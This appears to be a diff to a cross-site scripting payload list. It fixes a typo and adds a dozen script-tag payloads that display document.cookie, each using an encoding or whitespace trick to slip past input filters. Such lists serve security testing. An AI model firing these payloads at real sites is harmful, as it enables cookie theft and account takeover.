@@ -2,4 +2,20 @@
 <script>confirm(1)</script>
 <script>prompt(1)</script>
 
-<script>alert(document.cookieo)</script>
+<script>alert(document.cookie)</script>
+%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+
+<script src='x' onerror=alert(document.cookie)></script>
+<script+src='x'+onerror=alert(document.cookie)></script>
+<script/src='x'/onerror=alert(document.cookie)></script>
+<script%0asrc='x'%0aonerror=alert(document.cookie)></script>
+<script%09src='x'%09onerror=alert(document.cookie)></script>
+<script%0Csrc='x'%0Conerror=alert(document.cookie)></script>
+<script+src='x'+On%20error=alert(document.cookie)></script>
+<script+src='x'+On%0aerror=alert(document.cookie)></script>
+<script+src='x'+On%09error=alert(document.cookie)></script>
+<script+src='x'+On%0Cerror=alert(document.cookie)></script>
+%3Cscript%0Csrc%3D%27x%27%0Conerror%3Dalert%28document.cookie%29%3E%3C%2Fscript%3E
+
+
+
